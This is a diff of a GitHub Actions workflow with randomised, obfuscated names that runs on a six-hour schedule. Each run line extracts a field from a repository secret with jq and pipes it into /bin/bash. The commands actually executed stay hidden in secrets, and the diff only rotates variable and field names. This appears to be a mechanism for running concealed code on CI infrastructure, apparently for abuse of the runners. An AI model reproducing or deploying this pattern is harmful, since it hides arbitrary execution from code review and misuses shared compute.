@@ -1,33 +1,22 @@
 name: workgongzuol
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 0/6 * * *'
+    - cron: '33 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: workgongzuol
         env:
-          enn2265: ${{ secrets.enn2265 }}
+          u32599: ${{ secrets.u32599 }}
         run: |
-          echo $enn2265 | jq -r .ppy4 | /bin/bash
-          echo $jss8 | jq -r .ntgh322 | /bin/bash
-          echo $ggs1825 | jq -r .ylv856 | /bin/bash
-          echo $dv697 | jq -r .kbh090 | /bin/bash
-          echo $ltra56 | jq -r .oanph7509 | /bin/bash
-          echo $j95 | jq -r .pk095 | /bin/bash
-          echo $uqsu661 | jq -r .f3 | /bin/bash
-          echo $b48827 | jq -r .v8 | /bin/bash
-          echo $hd2972 | jq -r .ej406 | /bin/bash
-          echo $bzozz47 | jq -r .dofem1581 | /bin/bash
-          echo $vqwqx410 | jq -r .pkc41 | /bin/bash
-          echo $e8 | jq -r .ffix4522 | /bin/bash
-          echo $xgshd1 | jq -r .yszge60276 | /bin/bash
-          echo $ovhi94 | jq -r .tupwf501 | /bin/bash
-          echo $vr44 | jq -r .f133 | /bin/bash
-          echo $dcpu3098 | jq -r .c3311 | /bin/bash
-          echo $xjvt0 | jq -r .exg84 | /bin/bash
+          echo $u32599 | jq -r .olv9 | /bin/bash
+          echo $zeii3318 | jq -r .g0613 | /bin/bash
+          echo $yz63 | jq -r .hqgqv4903 | /bin/bash
+          echo $fzs3 | jq -r .lyvt3 | /bin/bash
+          echo $gy0223 | jq -r .rnm75 | /bin/bash
 
